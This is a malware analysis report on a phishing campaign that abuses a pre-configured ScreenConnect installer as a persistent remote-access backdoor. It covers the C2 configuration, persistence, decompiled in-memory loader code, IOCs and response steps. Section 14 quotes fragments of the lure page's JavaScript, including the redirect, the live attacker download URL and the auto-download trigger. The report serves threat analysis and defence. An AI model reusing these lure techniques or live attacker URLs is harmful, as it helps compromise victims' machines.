# Malware Analysis Report — jmorgan (ScreenConnect RAT)
**Analyst:** Kefas Lungu ([@kefaslungu](https://github.com/kefaslungu))
**Date:** 2026-10-26
**Classification:** Weaponized Legitimate Tool (RAT via ScreenConnect/ConnectWise Control)
**Threat Level:** HIGH — persistent remote access backdoor

> This repository contains **no malware**. The sample and all extracted binaries are excluded (see `.gitignore`). Everything is identified by hash below.

## VirusTotal

**[ScreenConnect.ClientSetup.exe](https://www.virustotal.com/gui/file/ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3)** — 17/69 detections. Full analysis notes posted to the Community tab.

```
ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3
```

---

## 1. Executive Summary

A phishing email with a URL shortened link (`https://rebrand.ly/p1vyczk`) redirected to
`https://myinnercircle.top/wubwqku34e/` (flagged by Chrome as a known phishing site).
The site silently initiated a download of `ScreenConnect.ClientSetup.exe`, disguised as an
"invitation card."

The file is a genuine ConnectWise ScreenConnect v26.7.6.9783 client installer that has been
**pre-configured by an attacker** to establish persistent, silent remote access to the victim's
machine. It is NOT traditional malware — it uses a legitimate remote desktop tool as a RAT,
making it harder to detect.

---

## 2. File Identification

| Field                | Value |
|----------------------|-------|
| Filename             | `ScreenConnect.ClientSetup.exe` |
| Size                 | 12,842,552 bytes (12.2 MB) |
| SHA-256              | `ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3` |
| File Type            | PE32 (x86), native Windows executable |
| Subsystem            | GUI (no console window — runs silently) |
| Compile Timestamp    | 2022-11-18 20:10:20 UTC (native DotNetRunner wrapper) |
| Product Version      | 26.7.6.9783 (ScreenConnect v26.7, July 2026) |
| Manifest UAC Level   | **`requireAdministrator`** — forces UAC elevation prompt |

---

## 3. PE Structure

| Section  | Virtual Size | Raw Size   | Flags            | Notes |
|----------|-------------|------------|------------------|-------|
| `.text`  | 0xB1AF      | 0xB200     | CODE, EXECUTE    | Native launcher code (~45 KB) |
| `.rdata` | 0x6078      | 0x6200     | READ             | Imports, strings |
| `.data`  | 0x11E4      | 0x800      | READ/WRITE       | Global data |
| `.rsrc`  | **0xC2AE18** | **0xC2B000** | READ           | **12.7 MB — entire payload** |
| `.reloc` | 0xEA8       | 0x1000     | DISCARD          | Relocations |

**The `.rsrc` section is 99% of the file** — a classic dropper/loader pattern.

---

## 4. Execution Chain

```
ScreenConnect.ClientSetup.exe   (native PE32 — DotNetRunner)
  │
  ├── FindResourceW / LoadResource / LockResource
  │     Loads embedded .NET assemblies from .rsrc:
  │     ├── _RESOLVER     (5.6 KB  .NET — assembly resolver)
  │     ├── _ENTRYPOINT   (19.5 KB .NET — ClientInstallerRunner)
  │     ├── ScreenConnect.Core v26.7.6.9783   (586 KB .NET)
  │     ├── ScreenConnect.Windows v26.7.6.9783 (1.7 MB .NET)
  │     └── ScreenConnect.WindowsInstaller     (140 KB .NET)
  │
  ├── CorBindToRuntimeEx (mscoree.dll)
  │     Boots .NET CLR in-process
  │
  ├── SC_PAYLOAD  (10.2 MB — entropy 7.95/8.0, ENCRYPTED/SIGNED)
  │     ├── RSA-2048 public key header at offset 0x00
  │     └── OLE/MSI compound file at offset 0x11C
  │           └── extracted_payload.msi
  │                 └── ScreenConnect Client (67c6a273dd7a01db)\
  │                       ├── ScreenConnect.ClientService.exe  (persistent service)
  │                       ├── ScreenConnect.WindowsClient.exe  (GUI client)
  │                       ├── ScreenConnect.Client.dll
  │                       ├── ScreenConnect.Core.dll
  │                       ├── ScreenConnect.Windows.dll
  │                       ├── ScreenConnect.WindowsCredentialProvider.dll
  │                       ├── ScreenConnect.WindowsAuthenticationPackage.dll
  │                       └── system.config  ← C2 CONFIGURATION
  │
  └── Runs msiexec.exe to install the MSI silently
```

---

## 5. C2 Configuration (CRITICAL)

Extracted from `system.config` (ClientLaunchParametersConstraint):

```
h = instance-b6ny1e-relay.screenconnect.com
p = 443
e = Access
y = Guest
k = [RSA-2048 public key — see below]
```

| Parameter | Value | Significance |
|-----------|-------|--------------|
| `h` | `instance-b6ny1e-relay.screenconnect.com` | **C2 relay server** (ConnectWise cloud infrastructure) |
| `p` | `443` | Port **HTTPS/TLS** — bypasses most firewall rules |
| `e` | `Access` | **Persistent access** session — attacker connects at ANY TIME without victim interaction |
| `y` | `Guest` | Victim is the "Guest" (controlled party); attacker is the "Host" |
| `k` | `BgIAAACkAABSU0Ex...` | RSA-2048 public key (Base64, CryptImportKey blob format) |

**`e=Access` is the most critical parameter.** Unlike a Support session (one-time, user-initiated),
an Access session gives the attacker full, permanent, silent remote control — screen, files,
keyboard, mouse, command execution — without any victim interaction after installation.

---

## 6. Post-Installation Persistence Artifacts

If the file had been executed, it would create the following on the victim's machine:

| Artifact | Value |
|----------|-------|
| **Windows Service** | `ScreenConnect Client (67c6a273dd7a01db)` |
| **Install Directory** | `%ProgramFiles(x86)%\ScreenConnect Client (67c6a273dd7a01db)\` |
| **URL Protocol Handler** | `sc-67c6a273dd7a01db://` (registered in HKLM) |
| **Registry (SafeBoot)** | `SYSTEM\CurrentControlSet\Control\SafeBoot\Network\[SERVICE_NAME]` |
| **Auth Package (LSA)** | `ScreenConnect.WindowsAuthenticationPackage.dll` registered with LSA |
| **Credential Provider** | `ScreenConnect.WindowsCredentialProvider.dll` registered with CLSID `{6FF59A85-BC37-4CD4-25D9-0DE352F14A29}` |
| **Uninstall GUID** | `{B292C5EA-BF5F-4280-B056-1670FB10BB1D}` |

The service starts automatically (AUTOSTART), runs as SYSTEM, and reconnects to C2 on boot.
The LSA Authentication Package and Credential Provider registrations give the attacker
access to **Windows login sessions and credentials**.

---

## 7. Developer / Build Attribution

The following PDB paths were found embedded in the binaries:

| PDB Path | Component |
|----------|-----------|
| `C:\Users\jmorgan\Source\cwcontrol\Custom\DotNetRunner\Release\DotNetRunner.pdb` | **Developer: `jmorgan`**, custom DotNetRunner wrapper |
| `C:\builds\cc\cwcontrol\Product\ClientInstallerRunner\obj\Release\ScreenConnect.ClientInstallerRunner.pdb` | Build server: `C:\builds\cc\` |
| `C:\builds\cc\cwcontrol\Product\Core\obj\Release\net20\ScreenConnect.Core.pdb` | Build server: `C:\builds\cc\` |

- The `cwcontrol` project path confirms this is ConnectWise Control (legitimate product).
- Developer username `jmorgan` is an internal ConnectWise developer.
- The installer itself is **authentic ConnectWise software** — it has been weaponized, not tampered with.

---

## 8. Notable Strings

| String | Significance |
|--------|--------------|
| `PayloadStuffingTechnique` | Class/method name in `_ENTRYPOINT` — describes the MSI embedding method |
| `GetOriginalPayload` | Retrieves original encrypted MSI payload |
| `https://check.screenconnect.com/InstallerOriginInfo.axd` | Calls home to verify installer origin (analytics/telemetry) |
| `https://feedback.screenconnect.com/Feedback.axd` | Feedback endpoint |
| `msiexec.exe` | Used to silently install the embedded MSI |
| `requireAdministrator` | Manifest — forces UAC elevation |
| `AlwaysDeleteSessionOnExit` | Can auto-delete sessions on disconnect |
| `AccessAutoConsentIfUserProcessNotRunning` | Auto-consents to access when no user is present |

---

## 9. Indicators of Compromise (IOCs)

### File Hashes
| File | SHA-256 |
|------|---------|
| `ScreenConnect.ClientSetup.exe` | `ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3` |

### Network IOCs
| Indicator | Type | Description |
|-----------|------|-------------|
| `instance-b6ny1e-relay.screenconnect.com` | Domain | **C2 relay server** (outbound C2 from installed client) |
| `annemadecards.screenconnect.com` | Domain | **Attacker's download server** (ConnectWise-hosted, serves EXE) |
| `myinnercircle.top` | Domain | Phishing/delivery server |
| `rebrand.ly/p1vyczk` | URL | Shortened delivery URL (email lure) |
| `myinnercircle.top/x6j11v46um/` | URL | Alternate/non-Windows payload path |
| `443/TCP` | Port | C2 communication port |

### Registry IOCs
| Key | Value |
|-----|-------|
| `HKLM\SOFTWARE\Classes\sc-67c6a273dd7a01db` | URL Protocol handler |
| `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ScreenConnect Client (67c6a273dd7a01db)` | Safe mode persistence |
| `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages` | LSA auth package injection |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{6FF59A85-BC37-4CD4-25D9-0DE352F14A29}` | Credential provider |

### Installer IOCs
| Field | Value |
|-------|-------|
| Instance Fingerprint | `67c6a273dd7a01db` |
| Product Code | `{B292C5EA-BF5F-4280-B056-1670FB10BB1D}` |
| Upgrade Code | `{20AB6B9A-CF56-446C-A5AB-99B56F58BAFF}` |
| Credential Provider CLSID | `{6FF59A85-BC37-4CD4-25D9-0DE352F14A29}` |

---

## 10. VirusTotal Results

**Hash:** `ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3`
**Detection ratio:** 17 / 69
**First submitted:** 2026-10-24 13:29:38 UTC (2 days before this analysis — fresh campaign)
**Threat label:** `hacktool.connectwise/connectwisecontrol`

| Engine | Category | Detection Label |
|--------|----------|----------------|
| Microsoft | Malicious | `Trojan:Win32/Sonbokli.A!cl` |
| Kaspersky | Malicious | `not-a-virus:HEUR:RemoteAdmin.Win32.ConnectWise.gen` |
| ESET-NOD32 | Malicious | `Win32/RemoteAdmin.ConnectWiseControl.Q potentially unsafe application` |
| SentinelOne | Malicious | `Static AI - Suspicious PE` |
| Google | Malicious | `Detected` |
| Tencent | Malicious | `OB:Trojan.Win32.ScreenConnect.16007504` |
| DrWeb | Malicious | `Program.RemoteAdmin.975` |
| Rising | Malicious | `Hacktool.ConnectWiseControl!8.17790 (CLOUD)` |
| Cylance | Malicious | `Unsafe` |
| VBA32 | Malicious | `BScope.Riskware.ConnectWise` |
| Yandex | Malicious | `Riskware.RemoteAdmin!O4vT/8AeK2A` |
| Varist | Malicious | `W32/ConnectWise.AB.gen!Eldorado` |
| TrellixENS | Malicious | `Artemis!E25C166A0E36` |
| Zillya | Malicious | `Tool.Convagent.Win32.869` |
| NANO-Antivirus | Malicious | `Riskware.Win32.RemoteAdmin.ljylbz` |
| huorong | Malicious | `HackTool/ConnectWiseControl.i` |
| Jiangmin | Malicious | `Trojan.Agent.edgo` |

**YARA rules matched (crowdsourced):**
- `INDICATOR_RMM_ConnectWise_ScreenConnect` by ditekSHen — confirms weaponized RMM
- `INDICATOR_EXE_DotNET_Encrypted` by ditekSHen — confirms encrypted .NET payload

**Sigma rules hit:** 1 high, 6 medium severity

**VirusTotal link:** https://www.virustotal.com/gui/file/ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3

---

## 11. Ghidra Decompilation Analysis

**Tool:** Ghidra 12.0.3 via PyGhidra 3.0.2 (Python 3.13)
**Functions identified:** 404 total
**Entry point:** `0x004014AD  entry`

### Call Chain

```
entry()  [0x004014AD]
  └─ ___security_init_cookie()
  └─ __scrt_common_main_seh()  [0x00401331]  — MSVC CRT startup
       └─ FUN_00401140(hInstance=0x400000, ...)  — WinMain
            ├── [Stage 1] Harden DLL search order
            ├── [Stage 2] Bootstrap .NET CLR
            └── [Stage 3] Load .NET assemblies from .rsrc (fileless)
                   ├── FUN_00401010(L"_RESOLVER")
                   └── FUN_00401010(L"_ENTRYPOINT")
```

### FUN_00401140 — WinMain / CLR Bootstrapper

Three distinct stages in the decompiled code:

**Stage 1 — DLL Hijack Prevention:**
```c
pHVar1 = LoadLibraryW(L"kernel32");
pFVar2 = GetProcAddress(pHVar1, "SetDefaultDllDirectories");
(*pFVar2)(0x800);   // LOAD_LIBRARY_SEARCH_SYSTEM32 only
```
Locks DLL resolution to `System32` before loading anything — prevents DLL planting attacks against the launcher itself.

**Stage 2 — Bootstrap .NET CLR (dual-path):**
```c
// Primary: modern API (.NET 4+)
pHVar1 = LoadLibraryW(L"mscoree.dll");
pFVar2 = GetProcAddress(pHVar1, "CLRCreateInstance");
(*pFVar2)(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &metaHost);
metaHost->GetRuntime(metaHost, L"v4.0.30319", &IID_ICLRRuntimeInfo, &runtimeInfo);
runtimeInfo->GetInterface(runtimeInfo, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &host);

// Fallback: legacy API (.NET 2.0)
CorBindToRuntimeEx(NULL, NULL, 0, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &host);

host->Start(host);  // Start the CLR
```
Tries CLR v4 first, falls back to v2. Supports both `.NET 4.x` and `.NET 2.0` targets.

**Stage 3 — Fileless .NET Execution:**
```c
FUN_00401010(L"_RESOLVER");    // Load assembly resolver first
FUN_00401010(L"_ENTRYPOINT");  // Then load and run the installer runner
```

### FUN_00401010 — Fileless Assembly Loader (most significant)

```c
// 1. Find the assembly in .rsrc by type "FILES" and name (e.g. "_ENTRYPOINT")
hResInfo = FindResourceW(hModule, assemblyName, L"FILES");
hResData = LoadResource(hModule, hResInfo);
ptr      = LockResource(hResData);
size     = SizeofResource(hModule, hResInfo);

// 2. Copy raw bytes into a COM SAFEARRAY (VT_UI1 = byte array)
pSVar1 = SafeArrayCreateVector(0x11, 0, size);
SafeArrayAccessData(pSVar1, &buf);
memcpy(buf, ptr, size);           // <-- assembly bytes copied to memory
SafeArrayUnaccessData(pSVar1);

// 3. Load assembly directly into CLR — never touches disk
(*vtbl_IAppDomain[0xb4/4])(appDomain, pSVar1, &assembly);  // IAppDomain::Load_3

// 4. Invoke entry point
(*vtbl_Assembly[0x40/4])(assembly, &methodInfo);            // Assembly::get_EntryPoint
(*vtbl_MethodInfo[0x94/4])(methodInfo, args, &result);      // MethodInfo::Invoke_3
```

**The `_RESOLVER` and `_ENTRYPOINT` assemblies are loaded entirely in memory via `IAppDomain::Load_3`.
They are never written to disk.** This is a deliberate evasion technique — most AV/EDR solutions
that rely on file-system monitoring will not intercept these assemblies.

### API Cross-Reference Summary

| API | Address | Called from | Purpose |
|-----|---------|-------------|---------|
| `FindResourceW` | 0x00000008 | `FUN_00401010` | Locate embedded assembly in .rsrc |
| `LoadResource` | 0x00000007 | `FUN_00401010` | Load resource handle |
| `LockResource` | 0x00000005 | `FUN_00401010` | Get raw pointer to assembly bytes |
| `SizeofResource` | 0x00000004 | `FUN_00401010` | Get assembly size |
| `CorBindToRuntimeEx` | 0x00000001 | `FUN_00401140` | Legacy .NET CLR bootstrap fallback |
| `LoadLibraryW` | 0x00000006 | `FUN_00401140` | Load mscoree.dll at runtime |
| `GetProcAddress` | 0x00000009 | `FUN_00401140` | Resolve CLRCreateInstance dynamically |
| `IsDebuggerPresent` | 0x0000001B | `FUN_00401943` | MSVC CRT anti-debug (standard) |

No `VirtualAlloc`, `CreateRemoteThread`, or process injection detected. The native launcher
itself is clean. All malicious behaviour originates from the **MSI configuration** and the
**`_ENTRYPOINT` .NET assembly** loaded at runtime.

---

## 12. Attack Technique Mapping (MITRE ATT&CK)

| Technique | ID | Details |
|-----------|----|---------|
| Phishing Link | T1566.002 | Lure email → URL shortener → phishing site |
| User Execution: Malicious File | T1204.002 | Victim downloads and (almost) ran the EXE |
| Remote Access Software | T1219 | ScreenConnect used as RAT |
| Encrypted Channel | T1573 | TLS on port 443 to relay server |
| Boot/Logon Autostart: Windows Service | T1543.003 | Installs AUTOSTART service |
| Modify Authentication Process: LSA Auth Package | T1547.002 | Registers LSA auth package |
| Modify Authentication Process: Credential Provider | T1556.006 | Registers credential provider DLL |
| Reflective Code Loading / Fileless Execution | T1620 | `_RESOLVER` + `_ENTRYPOINT` loaded via `IAppDomain::Load_3` — never written to disk |
| Obfuscated Files or Information: Embedded Payloads | T1027.009 | RSA-signed + encrypted MSI stuffed into .rsrc (entropy 7.95/8.0) |
| System Binary Proxy Execution: Msiexec | T1218.007 | `msiexec.exe` used to silently install the dropped MSI |

---

## 13. Recommended Response

1. **Delete** `ScreenConnect.ClientSetup.exe` immediately — do not execute.
2. **Block** `instance-b6ny1e-relay.screenconnect.com`, `annemadecards.screenconnect.com`, and `myinnercircle.top` at your firewall/DNS.
3. **Submit hash** `ff1e15cdb4ec8214c2a90dcb4040a4b0ef8c6d60539e90ff93fe1d79f7d685c3` to VirusTotal.
4. **Report phishing URL** to Google Safe Browsing and ConnectWise (abuse@connectwise.com).
5. If installed on any other machine — check for service `ScreenConnect Client (67c6a273dd7a01db)` and remove.
6. Since this used ConnectWise's own cloud relay, **report the instance fingerprint `67c6a273dd7a01db`** to ConnectWise to have the attacker's instance shut down.

---

## 14. HTML Phishing Lure Analysis

**File:** `[ANALYST_PATH]\Downloads\Exclusive Invitation.html`
**Purpose:** Browser-delivered lure — impersonates BlueMountain e-greeting card service to trick the victim into running the installer.

### Overview

The HTML file is a polished social engineering page that:
- Detects the victim's OS and routes them to the correct payload
- Auto-starts the EXE download after a 3-second delay (no user click required)
- Displays fake "how to open your eCard" instructions that walk the victim through executing the malware and consenting to UAC
- Silently exfiltrates victim telemetry (IP, geolocation, OS, browser) to the attacker via a Telegram bot

### OS Detection and Download Routing

```javascript
const ua = navigator.userAgent || "";
const isWindows = /Windows NT/i.test(ua);
if (!isWindows) { window.location.replace("https://myinnercircle.top/x6j11v46um/"); }
```

| OS | Action |
|----|--------|
| Windows | Auto-downloads `ScreenConnect.ClientSetup.exe?e=Access&y=Guest` from `annemadecards.screenconnect.com` |
| macOS | Downloads a separate `.pkg` installer + `config.data` (different payload) |
| Other | Immediate redirect to `https://myinnercircle.top/x6j11v46um/` |

The Windows download URL hardcoded in the page:
```
https://annemadecards.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest
```
This is a **ConnectWise-hosted subdomain** configured for the attacker's instance. It differs from the C2 relay (`instance-b6ny1e-relay.screenconnect.com`) — this one serves the installer, the other handles ongoing remote control traffic.

### Auto-Download Trigger

```javascript
setTimeout(() => { initiateDownload(); }, 3000);
```

The download fires automatically 3 seconds after the page loads. The victim does not need to click anything — just visiting the page starts the download.

### "How to Open Your eCard" — Social Engineering Instructions

A modal dialog on the page provides step-by-step instructions to run the malware:

> **How to Open Your eCard**
> 1. The `Invite` file is downloading automatically.
> 2. Find it in your **Downloads** folder.
> 3. **Double-click to launch the e-Card.**
> 4. **Follow the wizard to complete setup.**
> 5. Open the e-Card to reveal your invitation details!

This is the core manipulation:
- Step 3 normalises running a `.exe` by calling it "launching the e-Card"
- Step 4 tells the victim to "follow the wizard" — which includes clicking **Yes** on the UAC elevation prompt
- The greeting card story is maintained throughout to prevent suspicion

Without this coaching, many victims would hesitate at the UAC prompt. These instructions remove that friction.

### Victim Telemetry Exfiltration

Before and after the download, the page collects and silently POSTs victim data to `report.php` on the delivery server. That endpoint forwards it to an attacker-controlled Telegram bot, giving the attacker a live feed of who visited and downloaded the payload.

| Data Collected | Method |
|---------------|--------|
| Public IP address | `ipify.org` API |
| City, country, ISP | `ipapi.co` geolocation API |
| Operating system | Parsed from User-Agent |
| Full browser User-Agent | `navigator.userAgent` |
| Page URL | `window.location.href` |
| Timestamp | `new Date()` |

### Additional IOCs from Lure

| Indicator | Type | Notes |
|-----------|------|-------|
| `annemadecards.screenconnect.com` | Domain | Attacker-controlled download server on ConnectWise infra |
| `myinnercircle.top/x6j11v46um/` | URL | Non-Windows redirect / alternate payload |
| `f0562538138149b7b3b0ea3554e45d1e` | Cloudflare token | Beacon token #1 embedded in lure page |
| `c0445a1877504b0f98045742074abc31` | Cloudflare token | Beacon token #2 embedded in lure page |
| `report.php` | Endpoint | Victim telemetry exfil (same origin as lure page) |

---

## 15. Domain & Infrastructure OSINT

Script: `08_domain_recon.ps1`

### myinnercircle.top — Delivery Server

| Field | Value |
|-------|-------|
| **Registrar** | PDR Ltd (PublicDomainRegistry.com) |
| **Registration date** | **2026-10-25** — 1 day before this analysis |
| **Expiry date** | 2027-10-25 (1-year burner registration) |
| **Nameservers** | `mcgrory.ns.cloudflare.com`, `wally.ns.cloudflare.com` |
| **A records** | `104.21.18.146`, `172.67.182.87` — both Cloudflare AS13335 (anycast proxy) |
| **Live DNS** | `188.114.96.0`, `188.114.97.0` — Cloudflare anycast (rotates) |
| **Origin IP** | Hidden behind Cloudflare — not recoverable via DNS |
| **TLS certificate** | No domain cert in CT logs (crt.sh: none) — uses Cloudflare shared certificate |
| **VT detections** | 0/37 — not yet flagged on VirusTotal (fresh domain) |
| **URLScan.io** | No prior scans — not yet indexed by automated scanners |
| **Registrant** | Fully privacy-protected (PDR privacy service) |
| **Domain status** | `clientTransferProhibited`, `addPeriod` (newly registered) |

**Key observations:**

- The domain was registered **the day before** the phishing campaign launched. This is a purpose-built burner domain, not a compromised legitimate site.
- The `.top` TLD is heavily used for disposable phishing infrastructure due to low registration cost.
- Cloudflare was configured on the same day as registration — the attacker stood this up quickly and deliberately.
- The **Cloudflare Turnstile bot-challenge** (Screenshot 145) is consistent with the two Cloudflare beacon tokens found embedded in the HTML lure (`f0562538138149b7b3b0ea3554e45d1e`, `c0445a1877504b0f98045742074abc31`). The challenge filters automated scanners and sandboxes before the lure page is served, reducing detection.
- With Cloudflare as a proxy, the true hosting provider and server location cannot be determined from passive DNS alone.

### annemadecards.screenconnect.com — Installer Download Server

| Field | Value |
|-------|-------|
| **Type** | Subdomain of ConnectWise-managed `screenconnect.com` |
| **Role** | Hosts and serves `ScreenConnect.ClientSetup.exe` |
| **Download URL** | `https://annemadecards.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest` |
| **URL parameters** | `e=Access` (persistent session), `y=Guest` (victim role) — match the `system.config` C2 parameters |
| **CNAME** | `server-ovh60020014-web.screenconnect.com` |
| **Resolved IP** | `148.113.190.172` — OVH Canada (AS16276) |
| **VT status** | Not in VT database |
| **Ownership** | Attacker-controlled subdomain provisioned through their ConnectWise account |

This is legitimate ConnectWise infrastructure being abused. The `annemadecards` subdomain is the name the attacker chose for their ConnectWise account — ConnectWise provisioned it automatically. The URL parameters encode the session type directly in the download link, meaning the installer is pre-configured at download time.

The CNAME reveals ConnectWise hosts this on OVH (a French hosting company), server `ovh60020014`, located in their Canadian datacenter.

### instance-b6ny1e-relay.screenconnect.com — C2 Relay

| Field | Value |
|-------|-------|
| **Type** | Subdomain of ConnectWise-managed `screenconnect.com` |
| **Role** | Persistent C2 relay — handles all attacker-victim traffic after installation |
| **Port** | 443 / TLS (indistinguishable from HTTPS traffic) |
| **CNAME** | `server-ovh60020014-relay.screenconnect.com` |
| **Resolved IP** | `51.79.7.81` — OVH Canada (AS16276) |
| **Instance ID** | `b6ny1e` (subdomain prefix) |
| **Instance fingerprint** | `67c6a273dd7a01db` (from `system.config`) |
| **VT detections** | 0/39 — clean (legitimate infrastructure) |
| **Ownership** | ConnectWise cloud relay — ConnectWise can shut it down at abuse@connectwise.com |

**How the attacker uses ConnectWise's domain:** ScreenConnect is a SaaS product. When anyone creates a ConnectWise cloud account, ConnectWise automatically provisions both subdomains for that account. The attacker registered an account (likely a trial, or with a stolen payment method) and received these subdomains as part of the service. ConnectWise owns and operates the servers; the attacker owns the account and its configuration. Reporting instance `67c6a273dd7a01db` to ConnectWise abuse deletes the account and immediately kills the C2 channel for any installed victims — no victim action required.

Both CNAME chains route to the **same OVH server** (`ovh60020014`): the relay IP `51.79.7.81` and download IP `148.113.190.172` are co-located on ConnectWise's OVH-hosted infrastructure in Canada.

### Infrastructure Summary

```
Victim browser
      │
      ▼
  rebrand.ly/p1vyczk  (URL shortener — masks destination)
      │
      ▼
  myinnercircle.top  (Cloudflare Turnstile → lure page)
  Registered: 2026-10-25  ← 1 day old
  DNS: Cloudflare AS13335  ← origin hidden
      │
      ├── Telemetry: report.php → Telegram bot (attacker gets victim IP + OS)
      │
      ▼
  annemadecards.screenconnect.com  (ConnectWise CDN)
      └── ScreenConnect.ClientSetup.exe  (auto-downloaded)
                │
                ▼ (if executed)
  instance-b6ny1e-relay.screenconnect.com:443  (persistent C2)
```

---

## 16. Extracted Artifacts Location

```
[SAMPLE_PATH]\
├── ScreenConnect.ClientSetup.exe              <- ORIGINAL SAMPLE (do not run) [NOT UPLOADED]
├── 01_pe_strings.ps1                          <- PE headers & imports extractor
├── 02_rsrc_parser.ps1                         <- .rsrc section parser & extractor
├── 03_payload_analysis.ps1                    <- SC_PAYLOAD entropy & string analysis
├── 04_extract_msi_config.ps1                  <- MSI extraction & C2 config extraction
├── 05_virustotal_check.ps1                    <- VirusTotal API hash lookup
├── 06_ghidra_analysis.py                      <- PyGhidra 3 decompilation script
├── 07_vt_upload.ps1                           <- VirusTotal upload & comment script
├── 08_domain_recon.ps1                        <- Domain/infrastructure OSINT (VT + DNS)
├── find_pyghidra.ps1                          <- Helper to locate PyGhidra wheel
├── ghidra_output.txt                          <- Full Ghidra decompilation output
├── readme.md                                  <- This report
└── extracted_resources\                        [NOT UPLOADED — binary artifacts]
    ├── ROOT_FILES__ENTRYPOINT_ID_0.bin            <- .NET entry point assembly
    ├── ROOT_FILES__RESOLVER_ID_0.bin              <- .NET assembly resolver
    ├── ROOT_FILES_SCREENCONNECT_CORE_*.bin        <- ScreenConnect.Core .NET DLL
    ├── ROOT_FILES_SCREENCONNECT_WINDOWS_*.bin     <- ScreenConnect.Windows .NET DLL
    ├── ROOT_FILES_SCREENCONNECT_WINDOWSINSTALLER_*.bin
    ├── ROOT_ID_10_SC_PAYLOAD_ID_0.bin             <- 10.2 MB encrypted payload
    ├── extracted_payload.msi                      <- Extracted MSI installer
    └── msi_extracted\
        └── ScreenConnect Client (67c6a273dd7a01db)\
            ├── system.config                      <- C2 CONFIG (h/p/k parameters)
            ├── ScreenConnect.ClientService.exe    <- Persistent service binary
            ├── ScreenConnect.WindowsClient.exe    <- Remote desktop client
            └── [other DLLs and config files]
```
